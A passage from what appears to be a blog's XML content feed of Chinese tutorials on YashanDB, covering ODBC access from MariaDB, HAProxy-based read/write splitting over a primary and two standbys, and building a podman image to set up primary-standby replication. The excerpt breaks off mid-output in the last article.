class="type">decimal</span>(<span class="number">2</span>,<span class="number">1</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.003</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>-&gt; YashanDB</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> TABLE_NAME,TABLE_TYPE <span class="keyword">FROM</span> USER_TABLES;</span><br><span class="line"></span><br><span class="line">TABLE_NAME                                                       TABLE_TYPE </span><br><span class="line"><span class="comment">---------------------------------------------------------------- ---------- </span></span><br><span class="line">T1                                                               HEAP      </span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> fetched.</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">desc</span> t1;</span><br><span class="line">NAME                                                             <span class="keyword">NULL</span>?     DATATYPE                          </span><br><span class="line"><span class="comment">---------------------------------------------------------------- --------- --------------------------------- </span></span><br><span class="line">ID                                                                         <span class="type">INTEGER</span>                           </span><br><span class="line">NAME                                                                       <span class="type">VARCHAR</span>(<span class="number">10</span>)                       </span><br><span class="line">CD                                                                         NUMBER(<span class="number">2</span>)                         </span><br><span class="line">CD2                                                                        NUMBER(<span class="number">2</span>)                         </span><br><span class="line">CD3                                                                        NUMBER(<span class="number">2</span>,<span class="number">1</span>)                       </span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> </span><br></pre></td></tr></table></figure></div>
<ul>
<li>分别查看表数据</li>
</ul>
<img  alt="imgdemo.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231128-2cb71843-cb6c-47a9-81e2-f110b5159b64.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="总结">总结</h2>
<p>到此，本文告一段落，我们已经介绍了如何为 YashanDB 配置 ODBC，并通过 ODBC 连接 YashanDB 数据库。<br>
以及，如何凭借 ODBC 在 MariaDB 中创建连接表，将 MariaDB 中的表连接到 YashanDB 中的表。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
]]></content>
      <categories>
        <category>YashanDB</category>
      </categories>
      <tags>
        <tag>mariadb</tag>
        <tag>yashandb</tag>
        <tag>odbc</tag>
      </tags>
  </entry>
  <entry>
    <title>「YashanDB个人版体验」基于 HAProxy 配置 YashanDB 的读写分离</title>
    <url>/2023/yashan/yashandb-haproxy/</url>
    <content><![CDATA[<img  alt="img-1-yashan-haproxy.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231127-6bb62021-8a17-4805-ab9e-4c0c54e18eba.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="前言">前言</h2>
<p>前文介绍了如何搭建 YashanDB 的主备高可用，本文进一步强化，基于 HAProxy 中间件，配置 YashanDB 的读写分离。</p>
<ul>
<li><a href="https://shawnyan.cn/2023/yashan/yashandb-install/">「YashanDB个人版体验」YashanDB 个人版安装初体验</a></li>
<li><a href="https://shawnyan.cn/2023/yashan/yashandb-dockerfile/">「YashanDB个人版体验」定制 Dockerfile 构建 YashanDB 个人版镜像，并基于此搭建主备高可用</a></li>
</ul>
<!--
- [「YashanDB个人版体验」YashanDB 个人版安装初体验](https://www.modb.pro/db/1719038517697929216)
- [「YashanDB个人版体验」定制 Dockerfile 构建 YashanDB 个人版镜像，并基于此搭建主备高可用](https://www.modb.pro/db/1727742975546564608)
-->
<p>搭建完成后，架构如下图所示。</p>
<img  alt="img1dataflow.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231127-da88e362-2cbe-483a-8479-20f177752cc0.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="搭建-YashanDB-的一主两备高可用架构">搭建 YashanDB 的一主两备高可用架构</h2>
<p>前文已经实现了 YashanDB 的一主一备高可用架构，本文将再增加一个 Standby 节点，两个备节点实现读的负载均衡。</p>
<p>实现步骤基本相同，把 <code>yas2</code> 换成 <code>yas3</code> 即可。</p>
<p>三个节点启动后，查看运行情况。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 ~]# podman ps</span><br><span class="line">CONTAINER ID  IMAGE                        COMMAND         CREATED        STATUS        PORTS       NAMES</span><br><span class="line">ad4d90c05055  shawnyan.cn/myyashan:latest  /usr/sbin/init  3 days ago     Up 3 days                 yas1</span><br><span class="line">232ec61af1f4  shawnyan.cn/myyashan:latest  /usr/sbin/init  3 days ago     Up 3 days                 yas2</span><br><span class="line">33a85a1144a4  shawnyan.cn/myyashan:latest  /usr/sbin/init  6 seconds ago  Up 5 seconds              yas3</span><br><span class="line">[root@rocky9 ~]# </span><br></pre></td></tr></table></figure></div>
<ul>
<li>主节点配置日志归档</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">SYSTEM</span> <span class="keyword">SET</span> ARCHIVE_DEST_2<span class="operator">=</span><span class="string">&#x27;SERVICE=10.188.0.13:1689&#x27;</span> <span class="keyword">scope</span><span class="operator">=</span><span class="keyword">both</span>;</span><br></pre></td></tr></table></figure></div>
<!--
RESTORE DATABASE FROM '/tmp/bak_2023112704511844';
create user sbtest1;
create table sbtest1.t1 (id int);
desc sbtest1.t1;
insert into sbtest1.t1 values (1);
commit;
select * from sbtest1.t1;
-->
<ul>
<li>配置主备复制</li>
</ul>
<p>配置步骤和语句同前文，这里不再赘述，来看配置后的情况。</p>
<img  alt="imgreplica.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231127-d8958c60-8038-4fd2-9705-e794e81e387d.png"
                      referrerpolicy="no-referrer"
                >
<ul>
<li>创建测试用户，并赋予连接权限</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建测试用户 username</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> username IDENTIFIED <span class="keyword">BY</span> <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- CREATE SESSION 为用户的最基本权限，拥有此权限后才可以连接数据库</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">CREATE</span> SESSION <span class="keyword">TO</span> username;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 授予角色或其他系统权限（如果有需要的话）</span></span><br><span class="line"><span class="keyword">GRANT</span> DBA <span class="keyword">TO</span> username;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">TO</span> username;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 授予测试用户查询表的权限</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ANY</span> <span class="keyword">TABLE</span> <span class="keyword">TO</span> username;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>验证主备复制</li>
</ul>
<p>在主节点 yas1 创建测试表，并写入测试数据。分别在 yas2 和 yas3 两个备节点查询。</p>
<p>此时，在 yas2 和 yas2 两个备节点，是无法写入数据的，因为已经开启了只读模式 <code>READ_ONLY</code>。</p>
<img  alt="img1pss.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231127-f04ded09-7095-443d-be9f-eb491bcc8509.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="编译安装-HAProxy-中间件">编译安装 HAProxy 中间件</h2>
<p>本文使用 HAProxy 2.8.4 版本，为当前最新 LTS 版本。</p>
<p>HAProxy 是常用的负载、代理中间件，其优点主要包括：</p>
<ol>
<li>很轻量，配置简单，提供优雅关闭服务和高可用功能。</li>
<li>支持虚拟主机，可以工作在4(tcp)~7(http)层。</li>
<li>可以对数据库进行负载均衡，对后端的 DB 节点进行检测和负载均衡。</li>
<li>负载均衡策略多样。</li>
</ol>
<p>HAProxy 的缺点包括：</p>
<ol>
<li>本身不具备高可用性，但可以和 Keepalived 搭配使用。</li>
<li>不支持 HTTP cache 功能，即不能做 Web 服务器。</li>
<li>多进程模式支持不够好。</li>
<li>不支持按语句区分请求类别，无法做到 SQL 级的读写分离。</li>
</ol>
<p>编译过程相对简单，下载源码， make 编译即可，主要步骤如下。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.haproxy.org/download/2.8/src/haproxy-2.8.4.tar.gz</span><br><span class="line">tar zxf haproxy-2.8.4.tar.gz</span><br><span class="line">cd haproxy-2.8.4/</span><br><span class="line">make CPU=generic TARGET=linux-glibc USE_PCRE2=1</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure></div>
<p>编译完成后，会生成名为 haproxy 的可执行二进制文件。查看安装后的文件路径。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 haproxy-2.8.4]# ls</span><br><span class="line">addons       CONTRIBUTING  include      README     tests</span><br><span class="line">admin        dev           INSTALL      reg-tests  VERDATE</span><br><span class="line">BRANCHES     doc           LICENSE      scripts    VERSION</span><br><span class="line">BSDmakefile  examples      MAINTAINERS  src</span><br><span class="line">CHANGELOG    haproxy       Makefile     SUBVERS</span><br><span class="line">[root@rocky9 haproxy-2.8.4]# sudo make install</span><br><span class="line">[root@rocky9 haproxy-2.8.4]# which haproxy</span><br><span class="line">/usr/local/sbin/haproxy</span><br></pre></td></tr></table></figure></div>
<p>安装完成后，查看版本信息：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 haproxy-2.8.4]$ haproxy -v</span><br><span class="line">HAProxy version 2.8.4-ShawnYan-a4ebf9d 2023/11/17 - https://haproxy.org/</span><br><span class="line">Status: long-term supported branch - will stop receiving fixes around Q2 2028.</span><br><span class="line">Known bugs: http://www.haproxy.org/bugs/bugs-2.8.4.html</span><br><span class="line">Running on: Linux 5.14.0-362.8.1.el9_3.x86_64 #1 SMP PREEMPT_DYNAMIC Wed Nov 8 17:36:32 UTC 2023 x86_64</span><br></pre></td></tr></table></figure></div>
<h2 id="配置-HAProxy">配置 HAProxy</h2>
<p>接下来进行 HAProxy 的配置，创建一个写监听和一个读监听。</p>
<p>写监听用于将将流量转发到主节点 (yas1)，并绑定端口到 <code>11688</code>。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">listen yashandb_rw</span><br><span class="line">	bind :11688</span><br><span class="line">	server db_primary 10.188.0.11:1688 check</span><br></pre></td></tr></table></figure></div>
<p>读监听用于将流量转发到备节点 (yas2,yas3)，并绑定端口到 <code>21688</code>。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">listen yashandb_ro</span><br><span class="line">	bind :21688</span><br><span class="line">	balance leastconn</span><br><span class="line">	server db_standby_1 10.188.0.12:1688 check</span><br><span class="line">	server db_standby_2 10.188.0.13:1688 check</span><br></pre></td></tr></table></figure></div>
<p>这里负载均衡算法选择 <code>leastconn</code>， HAProxy 可自动选将新连接分发到最小连接的节点。</p>
<p>此外，创建一个监控监听，用于访问 HAProxy 自带的监控面板。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">listen stats</span><br><span class="line">	bind *:8080</span><br><span class="line">	stats uri     /admin</span><br><span class="line">	stats auth    admin:admin</span><br></pre></td></tr></table></figure></div>
<p>监控面板可通过 URL <code>ip:8080/admin</code> 进行访问，增加了授权验证功能，用户名密码为： <code>admin/admin</code>。</p>
<p>完整版 <code>haproxy.cfg</code> 配置文件为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">global</span><br><span class="line">	log 127.0.0.1    local0</span><br><span class="line">	daemon</span><br><span class="line">defaults</span><br><span class="line">	log    global</span><br><span class="line">	mode    http</span><br><span class="line">	retries    3</span><br><span class="line">	option redispatch</span><br><span class="line">	timeout client 35s</span><br><span class="line">	timeout server 60s</span><br><span class="line">	timeout connect 5s    </span><br><span class="line">	maxconn    4096</span><br><span class="line">listen yashandb_rw</span><br><span class="line">	bind :11688</span><br><span class="line">	mode tcp</span><br><span class="line">	balance roundrobin</span><br><span class="line">	option clitcpka</span><br><span class="line">	server db_primary 10.188.0.11:1688 check</span><br><span class="line">listen yashandb_ro</span><br><span class="line">	bind :21688</span><br><span class="line">	mode tcp</span><br><span class="line">	balance leastconn</span><br><span class="line">	server db_standby_1 10.188.0.12:1688 check</span><br><span class="line">	server db_standby_2 10.188.0.13:1688 check</span><br><span class="line">listen stats</span><br><span class="line">	bind *:8080</span><br><span class="line">	mode http</span><br><span class="line">	stats enable</span><br><span class="line">	stats scope   .</span><br><span class="line">	stats uri     /admin</span><br><span class="line">	stats auth    admin:admin</span><br><span class="line">	stats refresh 5s</span><br><span class="line">	option httplog</span><br></pre></td></tr></table></figure></div>
<p>到此，HAProxy 配置完成，接下来启动 HAProxy 服务。</p>
<h2 id="启动-HAProxy">启动 HAProxy</h2>
<p>在启动 HAProxy 前，先进行配置文件有效性验证：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">haproxy -c -f ./haproxy.cfg</span><br></pre></td></tr></table></figure></div>
<p>输出：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">haproxy -c -f ./haproxy.cfg</span></span><br><span class="line">Configuration file is valid</span><br></pre></td></tr></table></figure></div>
<p>验证有效，启动 HAProxy 服务：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">haproxy -f ./haproxy.cfg</span><br></pre></td></tr></table></figure></div>
<p>输出：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 haproxy]$ haproxy -f ./haproxy.cfg</span><br><span class="line">[shawnyan@rocky9 haproxy]$ </span><br><span class="line">[shawnyan@rocky9 haproxy]# pstree -apg `pidof haproxy`</span><br><span class="line">haproxy,21742,21742 -f ./haproxy.cfg</span><br><span class="line">  ├─&#123;haproxy&#125;,21743,21742</span><br><span class="line">  ├─&#123;haproxy&#125;,21744,21742</span><br><span class="line">  ├─&#123;haproxy&#125;,21745,21742</span><br><span class="line">  ├─&#123;haproxy&#125;,21746,21742</span><br><span class="line">  ├─&#123;haproxy&#125;,21747,21742</span><br><span class="line">  ├─&#123;haproxy&#125;,21748,21742</span><br><span class="line">  └─&#123;haproxy&#125;,21749,21742</span><br><span class="line">[shawnyan@rocky9 haproxy]# </span><br></pre></td></tr></table></figure></div>
<p>查看监听端口：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 haproxy]$ ss -antpl|grep haproxy</span><br><span class="line">LISTEN 0      4096         0.0.0.0:21688      0.0.0.0:*    users:((&quot;haproxy&quot;,pid=21742,fd=6))</span><br><span class="line">LISTEN 0      4096         0.0.0.0:11688      0.0.0.0:*    users:((&quot;haproxy&quot;,pid=21742,fd=5))</span><br><span class="line">LISTEN 0      4096         0.0.0.0:8080       0.0.0.0:*    users:((&quot;haproxy&quot;,pid=21742,fd=7))</span><br></pre></td></tr></table></figure></div>
<h2 id="验证测试">验证测试</h2>
<p>分别连接 HAProxy 监听的两个端口，查看 YashanDB 数据库实例状态和主机名。可以看到，每次连接写端口 11688时，都能正确地连接到主机 yashan1，也可以正常读写。每次连接读端口 21688 时，主机名有时为 yashan2，有时为 yashan3，说明轮询机制生效。</p>
<img  alt="img2proxy.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231127-4cfa28a2-d463-440c-b597-14510edce4a6.png"
                      referrerpolicy="no-referrer"
                >
<!--
## HAProxy 监控面板

最后，来看加 HAProxy 的监控面板是否正确的监控到了 3 台 YashanDB 数据库，以及都展示了哪些监控项。

//todo， haproxy面板截图
-->
<h2 id="扩展">扩展</h2>
<p>本文到此告一段落，有些内容可以进一步扩展。<br>
比如 HAProxy + Keepalived 实现 HAProxy 的故障转移。<br>
再如，YashanDB 的 JDBC 测试，是否可以在 JDBC 实现读写分离的 IP 设定，或是否支持 Load Balance 配置等。</p>
<p>Ps. 这部分内容暂不展开，具体可以参考官方文档，<a class="link"   href="https://doc.yashandb.com/yashandb/23.1/zh/%E5%BC%80%E5%8F%91%E6%89%8B%E5%86%8C/JDBC%E9%A9%B1%E5%8A%A8/JDBC%E6%8E%A5%E5%8F%A3%E6%94%AF%E6%8C%81%E8%AF%B4%E6%98%8E/JDBC%E9%80%8F%E6%98%8E%E5%BA%94%E7%94%A8%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB.html" >JDBC透明应用故障转移 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>透明应用故障转移，即TAF全称Transparent Application Failover，驱动的透明应用故障转移功能，使你能够在连接的数据库实例发生故障时自动重新连接到数据库。</p>
<p>主备</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">&gt;jdbc:yasdb:primary:<span class="comment">//192.168.1.1:1688,192.168.1.2:1688,192.168.1.3:1688/yashan?failover=on&amp;failoverType=session&amp;failoverMethod=basic&amp;failoverRetries=5&amp;failoverDelay=1</span></span><br></pre></td></tr></table></figure></div>
<p>负载均衡</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">&gt;jdbc:yasdb:loadBalance:<span class="comment">//192.168.1.1:1688,192.168.1.2:1688,192.168.1.3:1688/yashan?failover=on&amp;failoverType=session&amp;failoverMethod=basic&amp;failoverRetries=5&amp;failoverDelay=1</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<h2 id="总结">总结</h2>
<p>YashanDB 个人版的高可用只能做到这种程度了，如需更高级别的高可用，则要引入 YashanDB 标准版或企业版，可以支持 YashanDB 共享集群 和 YashanDB 分布式集群。</p>
<p>为啥要用 podman ?<br>
隔离性好、更加轻便、更加安全。</p>
<p>为啥要用 HAProxy ？<br>
流量控制、负载均衡、适当冗余。</p>
<p>为啥要用 YashanDB ?<br>
兼容 O、少做梦、踏实干。</p>
<p>End.</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >]]></content>
      <categories>
        <category>YashanDB</category>
      </categories>
      <tags>
        <tag>yashandb</tag>
        <tag>haproxy</tag>
      </tags>
  </entry>
  <entry>
    <title>「YashanDB个人版体验」定制 Dockerfile 构建 YashanDB 个人版镜像，并基于此搭建主备高可用</title>
    <url>/2023/yashan/yashandb-dockerfile/</url>
    <content><![CDATA[<img  alt="01.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231124-abdfe0bb-f75d-4a72-bdd1-f8420c37763c.jpg"
                      referrerpolicy="no-referrer"
                >
<h2 id="TL-DR">TL;DR</h2>
<p>前文介绍了如何在 Rocky Linux 9 上安装 YashanDB 个人版，初体验过后，上点难度。</p>
<ul>
<li><a href="https://shawnyan.cn/2023/yashan/yashandb-install/">「YashanDB个人版体验」YashanDB 个人版安装初体验</a></li>
<li><a href="https://shawnyan.cn/2023/linux/rocky-9.3-upgrade-from-9.2/">【Rocky9】Rocky Linux 9.2 升级 9.3，及新特性实践</a></li>
</ul>
<!--
- [「YashanDB个人版体验」YashanDB 个人版安装初体验](https://www.modb.pro/db/1719038517697929216)
- [【Rocky9】Rocky Linux 9.2 升级 9.3，及新特性实践](https://www.modb.pro/db/1726849694440185856)
-->
<p>本文将介绍如何在本地环境，定制 Dockerfile 并自行构建 YashanDB 个人版的 Docker 镜像。</p>
<p>以及，基于该 Docker 镜像，启动两个容器，配置 YashanDB 的主备高可用。</p>
<p>本文篇幅略长，直接上干货，如有疑问，欢迎讨论。</p>
<h2 id="定制-Dockerfile-构建-YashanDB-个人版镜像">定制 Dockerfile 构建 YashanDB 个人版镜像</h2>
<p>这里就不赘述 Docker 的各种优势了，只是需要说明的是，本文使用的环境为 Rocky 9，docker 已经被 podman 所取代。</p>
<p>Dockerfile 的大体思路是：</p>
<ol>
<li>以 CentOS 7 为基础镜像，安装几个常用软件包</li>
<li>创建 <code>yashan</code> 用户，后面的操作将在该用户下进行</li>
<li>下载 YashanDB 个人版的安装包，并解压</li>
<li>使用 YashanDB 个人版安装包里的脚本安装崖山数据库</li>
</ol>
<p>具体 Dockerfile 内容如下：</p>
<div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> maintainer=<span class="string">&quot;Shawn Yan&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Install requirements.</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum install -y wget iproute epel-release \</span></span><br><span class="line"><span class="language-bash"> &amp;&amp; yum install -y rlwrap \</span></span><br><span class="line"><span class="language-bash"> &amp;&amp; yum clean all</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Env.</span></span><br><span class="line"><span class="keyword">ENV</span> YASDB_PKG=<span class="string">&quot;yashandb-personal-23.1.1.100-linux-x86_64.tar.gz&quot;</span> YASDB_INSTALL=/tmp/yashan</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create User</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -u 2023 yashan \</span></span><br><span class="line"><span class="language-bash"> &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;if command -v rlwrap &gt;/dev/null 2&gt;&amp;1; then alias yasql=&#x27;rlwrap yasql&#x27;; fi&quot;</span> &gt;&gt; /home/yashan/.bashrc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Download YashanDB pkg.</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> wget https://linked.yashandb.com/resource/<span class="variable">$YASDB_PKG</span> -P /tmp \</span></span><br><span class="line"><span class="language-bash"> &amp;&amp; <span class="built_in">mkdir</span> <span class="variable">$YASDB_INSTALL</span> \</span></span><br><span class="line"><span class="language-bash"> &amp;&amp; tar zxf /tmp/<span class="variable">$YASDB_PKG</span> -C <span class="variable">$YASDB_INSTALL</span> \</span></span><br><span class="line"><span class="language-bash"> &amp;&amp; <span class="built_in">rm</span> -f /tmp/<span class="variable">$YASDB_PKG</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Init.</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R yashan:yashan <span class="variable">$YASDB_INSTALL</span> \</span></span><br><span class="line"><span class="language-bash"> &amp;&amp; su -l yashan -c <span class="string">&quot;<span class="variable">$YASDB_INSTALL</span>/scripts/install.sh&quot;</span> 2&gt;&amp;1 &lt; /dev/null</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Mount</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">1688</span></span><br><span class="line"><span class="keyword">VOLUME</span><span class="language-bash"> [<span class="string">&quot;/tmp&quot;</span>]</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/usr/sbin/init&quot;</span>]</span></span><br></pre></td></tr></table></figure></div>
<p>使用 podman 构建镜像，调试 dockerfile 耗费了半天时间，skill 有些生疏了。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">podman build -f Dockerfile -t shawnyan.cn/myyashan .</span><br><span class="line">podman images</span><br></pre></td></tr></table></figure></div>
<img  alt="img-1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231124-00411d26-ee5a-4bd0-aa62-1f7776e45d22.png"
                      referrerpolicy="no-referrer"
                >
<p>到此，YashanDB 个人版镜像已经制作完成。</p>
<p>由于某些原因，Docker Hub 的上载、下行网速实在堪忧，建议感兴趣、有需求的同学在本地自行构建镜像，会更快、高效。</p>
<h2 id="启动-YashanDB-容器，并初始化">启动 YashanDB 容器，并初始化</h2>
<p>为了搭建 YashanDB 主备高可用，两个容器需要在一个网段，保证能够相互通信。这里先创建一个桥接网络，并在容器初始化时指定 IP 地址。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">podman network create -d bridge --subnet=10.188.0.0/16 mynw</span><br><span class="line">podman run --name yas1 --hostname yashan1 \</span><br><span class="line">  --network mynw --ip 10.188.0.11 \</span><br><span class="line">  -v /data/yas1:/tmp \</span><br><span class="line">  -d shawnyan.cn/myyashan</span><br><span class="line">podman run --name yas2 --hostname yashan2 \</span><br><span class="line">  --network mynw --ip 10.188.0.12 \</span><br><span class="line">  -v /data/yas2:/tmp \</span><br><span class="line">  -d shawnyan.cn/myyashan</span><br><span class="line">podman ps</span><br></pre></td></tr></table></figure></div>
<p>输出如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 ~]# podman run --name yas1 --hostname yashan1 \</span><br><span class="line">  --network mynw --ip 10.188.0.11 \</span><br><span class="line">  -v /data/yas1:/tmp \</span><br><span class="line">  -d shawnyan.cn/myyashan</span><br><span class="line">ad4d90c05055ea4cbf23b0467db19665b7a4e94ed5ea3bf185cc446c2deb55b3</span><br><span class="line">[root@rocky9 ~]# podman run --name yas2 --hostname yashan2 \</span><br><span class="line">  --network mynw --ip 10.188.0.12 \</span><br><span class="line">  -v /data/yas2:/tmp \</span><br><span class="line">  -d shawnyan.cn/myyashan</span><br><span class="line">232ec61af1f444e26ef89234f247a5c6c988d92e08498456b9f50fda994e3df9</span><br><span class="line">[root@rocky9 ~]# podman ps</span><br><span class="line">CONTAINER ID  IMAGE                        COMMAND         CREATED         STATUS         PORTS       NAMES</span><br><span class="line">ad4d90c05055  shawnyan.cn/myyashan:latest  /usr/sbin/init  20 seconds ago  Up 19 seconds              yas1</span><br><span class="line">232ec61af1f4  shawnyan.cn/myyashan:latest  /usr/sbin/init  6 seconds ago   Up 5 seconds               yas2</span><br><span class="line">[root@rocky9 ~]# </span><br></pre></td></tr></table></figure></div>
<p>上图也可以看到启动后的两个容器。</p>
<p>分别进入 yas1 和 yas2 两个容器。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">podman exec -it yas1 bash</span><br><span class="line">podman exec -it yas2 bash</span><br></pre></td></tr></table></figure></div>
<p>切换到 yashan 用户，并初始化数据库。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">su - yashan</span><br><span class="line">~/yashandb/yasdb_home/scripts/initDB.sh</span><br></pre></td></tr></table></figure></div>
<p>稍等片刻，数据库启动，我们来连接数据库，查看一下数据库启动状态和数据库名称。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">yasql sys/yasdb_123</span><br><span class="line">SELECT STATUS FROM V$INSTANCE;</span><br><span class="line">SELECT database_name FROM v$database;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>output, yas1:</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@yashan1 /]# su - yashan</span><br><span class="line">Last login: Thu Nov 23 10:04:38 UTC 2023</span><br><span class="line">[yashan@yashan1 ~]$ ~/yashandb/yasdb_home/scripts/initDB.sh</span><br><span class="line">process started!</span><br><span class="line">Database open succeed !</span><br><span class="line">[yashan@yashan1 ~]$ yasql sys/yasdb_123</span><br><span class="line">YashanDB SQL Personal Edition Release 23.1.1.100 x86_64</span><br><span class="line"></span><br><span class="line">Connected to:</span><br><span class="line">YashanDB Server Personal Edition Release 23.1.1.100 x86_64 - X86 64bit Linux</span><br><span class="line"></span><br><span class="line">SELECT STATUS FROM V$INSTANCE;</span><br><span class="line"></span><br><span class="line">STATUS        </span><br><span class="line">------------- </span><br><span class="line">OPEN         </span><br><span class="line"></span><br><span class="line">1 row fetched.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">SQL&gt; </span><span class="language-bash">SELECT database_name FROM v<span class="variable">$database</span>;</span></span><br><span class="line"></span><br><span class="line">DATABASE_NAME                                                    </span><br><span 